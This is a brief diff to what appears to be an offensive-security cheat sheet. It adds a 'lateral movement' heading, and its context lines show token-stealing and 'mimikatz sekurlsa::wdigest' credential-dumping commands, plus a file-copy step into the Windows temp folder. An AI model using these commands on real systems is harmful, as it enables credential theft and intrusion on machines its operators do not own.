@@ -9,6 +9,7 @@ steal_token 7750
 mimikatz sekurlsa::wdigest
 
 ```
+###  lateral movement
 ```
 #File Copy
 cd c:\windows\temp
